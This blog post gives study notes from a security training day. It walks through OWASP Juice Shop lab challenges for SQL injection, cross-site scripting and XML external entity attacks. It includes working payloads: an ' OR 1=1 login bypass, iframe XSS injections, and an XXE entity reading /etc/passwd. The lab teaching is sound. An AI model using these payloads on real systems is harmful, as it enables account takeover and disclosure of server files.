---
layout:            post
title:             Security Training Day 2
lang:                en
date:              2019-01-23 20:41:20 +0100
categories:        [tech]
tags:              [security, http, browser]
permalink:         /2019/01/23/security-training-day-2/
comments:          true
excerpt:           >
    My study notes of security training (day 2), including some ways of SQL
    injection, Cross-site scripting (XSS), and XML External Entity (XXE).
image:             /assets/bg-security-265130_1280.jpg
cover:             /assets/bg-security-265130_1280.jpg
article_header:
  type: overlay
  theme: dark
  background_color: "#203028"
  background_image:
    gradient: "linear-gradient(135deg, rgba(0, 0, 0, .6), rgba(0, 0, 0, .4))"
---

## Overview

This post is mainly a review of what have been taught during the security
training in day 2. In aims to share knowledge and make us aware of the
importance of security. After reading this article, you will understand:

- SQL Injection
- XSS: Cross-Site Scripting
- XXE: XML External Entity

Reminder: the security tools used here are [ZAP
Proxy](https://github.com/zaproxy/zaproxy) and [Juice
Shop](https://github.com/bkimminich/juice-shop) -- probably the most modern and
sophisticated insecure web application.

## SQL Injection

A [SQL injection attack](https://www.owasp.org/index.php/SQL_Injection)
consists of insertion or "injection" of a SQL query via the input data from the
client to the application. A successful SQL injection exploit can read
sensitive data from the database, modify database data (Insert/Update/Delete),
execute administration operations on the database (such as shutdown the DBMS),
recover the content of a given file present on the DBMS file system and in some
cases issue commands to the operating system. SQL injection attacks are a type
of injection attack, in which SQL commands are injected into data-plane input
in order to effect the execution of predefined SQL commands. This section solves
SQL Injection challenge in Juice Shop.

**Login Admin.** Log in with the administrator's user account. Firstly, go to
login page <http://localhost:3000/#/login>, enter an arbitrary login and
password, such as `foo@example.com` and `123`. UI shows "Invalid user or
password". Now, inspect HTTP request and response in ZAP Proxy where the url of
the entry is <http://localhost:3000/rest/user/login>. Open request editor and
edit the request body (excerpt 1). By the way, we can also imagine the SQL
query should be similar to the following form (excerpt 2).

```json
{
  "email" : "foo@example.com",
  "password" : "123"
}
```

```sql
SELECT *
  FROM Users
 WHERE email='foo@example.com' AND pass='123'
```

The SQL injection can be done as the first query parameter `email`. Use simple
quote `'` to end the quote (just in case), use criterion `OR 1=1` to ensure the
WHERE clause is always true and does not depend on email value, and use comment
`--` to comment the rest of the query. So the modification and expected SQL
looks like the following:

```json
{
  "email" : "' OR 1=1; --",
  "password" : "123"
}
```

```sql
SELECT *
  FROM Users
 WHERE email='' OR 1=1; -- ' AND pass='123'
```

The response returns the email of admin account with the correct token:

```json
{
  "authentication" : {
    "token" : "eyJhbG...",
    "bid" : 1,
    "umail" : "admin@juice-sh.op"
  }
}
```

Understand the usage of token `eyJhbG...` by inspecting the source code of
`main.js`, and finds out that user token will be saved in browser's local
storage after login action:

```js
this.userService.login(this.user).subscribe(function (n) {
  localStorage.setItem('token', n.token),
  l.cookieService.put('token', n.token),
  sessionStorage.setItem('bid', n.bid),
  l.userService.isLoggedIn.next(!0),
  l.router.navigate(['/search'])
}, function (n) { ... }
```

Therefore, we can set token to local storage manually to be able to simulate the
login action in browser console. After that, the login is successful as
expected.

```js
localStorage.setItem('token', 'eyJhbG...');
```

## Cross-Site Scripting (XSS)

[Cross-Site Scripting
(XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) attacks are
a type of injection, in which malicious
scripts are injected into otherwise benign and trusted websites. XSS attacks
occur when an attacker uses a web application to send malicious code, generally
in the form of a browser side script, to a different end user. Flaws that allow
these attacks to succeed are quite widespread and occur anywhere a web
application uses input from a user within the output it generates without
validating or encoding it. There're 3 types of XSS:

- Reflected XSS
- Persisted XSS
- DOM Based XSS

Different XSS filter can be found at [OWASP - XSS Filter Evasion
CheatSheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).
This section solves different XSS challenges in Juice Shop.

**XSS Tier 0.** Perform a reflected XSS attack with
``<iframe src="javascript:alert(`xss`)">``. This can be done by providing a
malicious query parameter Order ID (`id`) in Track Result module
<http://localhost:3000/#/track-result?id=myOrder>. Using the following query
param will trigger a reflected XSS (value is url-encoded):

    http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E

**XSS Tier 1**. Perform a DOM XSS attack with
``<iframe src="javascript:alert(`xss`)">``. This can be done by manipulating the
query param `q` in "search" module (<http://localhost:3000/#/search?q=apple>).
The result is not escaped, which leads to XSS.

<p align="center">
  <img src="/assets/20190123-xss-1.png"
       alt="XSS Tier 1">
</p>

**XSS Tier 2.** Perform a persisted XSS attack with
``<iframe src="javascript:alert(`xss`)">`` bypassing a client-side security
mechanism. This can be done by manipulating the user creation form. Go to
register page <http://localhost:3000/#/register> and enter username / password
as `foo@example.com` and `12345`. Then, modify the HTTP request in ZAP Proxy and
resend the request to server:

```json
{
  "email" : "foo@example.com<iframe src=\"javascript:alert(`xss`)\">",
  "password" : "12345",
  "passwordRepeat" : "12345",
  "securityQuestion" : {
    "id" : 1,
    "question" : "Your eldest siblings middle name?",
    "createdAt" : "2019-01-23T19:56:54.665Z",
    "updatedAt" : "2019-01-23T19:56:54.665Z"
  },
  "securityAnswer" : "12345"
}
```

When internal users visit the admin page
<http://localhost:3000/#/administration>, an XSS will be triggered.

## XML External Entity (XXE) Processing

An [XML External Entity attack][1] is a type of attack against an application
that parses XML input. This attack occurs when XML input containing a reference
to an external entity is processed by a weakly configured XML parser. This
attack may lead to the disclosure of confidential data, denial of service,
server side request forgery, port scanning from the perspective of the machine
where the parser is located, and other system impacts. This section solves XXE
challenge in Juice Shop.

**XXE Tier 1.** Retrieve the content of `C:\Windows\system.ini` or `/etc/passwd`
from the server. First of all, we need to feed an entry-point for uploading
files, so that our XML file can be read by the server. One possibility is via
Customer Complain <http://localhost:3000/#/complain>, where a file can be
uploaded. By default, the input element only accepts file types `.pdf` and
`.zip`. This check can be skipped by choosing format option "All Support Types"
when browsing files (maybe different according to OS, I'm using macOS).

```html
<input _ngcontent-c17=""
       accept=".pdf,.zip"
       id="file"
       ng2fileselect=""
       type="file">
```

Then, choose a file to upload. For example, `~/feedback.xml`:

```xml
<msg>hi</msg>
```

Once uploaded, find out the server response and check if it reads the value.
From the response of <http://localhost:3000/file-upload>, we can extract the
following value:

> Error: B2B customer complaints via file upload have been deprecated for security reasons: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;msg&gt;Hi&lt;/msg&gt; (feedback.xml)

As you can see, the content of feedback has been extracted successfully. Further
more, the content has been expanded: XML header has been added. We can suppose
that XXE is possible in this case. Now, change the content of XML to the
following, where system entity `xxe` is defined and discloses the system
password file:

```xml
<!DOCTYPE msg [
<!ELEMENT msg ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<msg>&xxe;</msg>
```

Upload the same file again with the new content, then inspect the HTTP response
again:

> Error: B2B customer complaints via file upload have been deprecated for security reasons: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE msg [&lt;!ELEMENT msg ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;msg&gt;### User Database# # Note that this file is consulted directly only when the sys... (feedback.xml)

The content is retrieved successfully.

## Conclusion

In this article, we saw the definition and challenges of three common security
problems: SQL Injection, Cross-Site Scripting (XSS) and XML External Entity
(XXE) processing. Through these challenges, we saw the impact of security
problems. Hope you enjoy this article, see you the next time!

[1]: https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
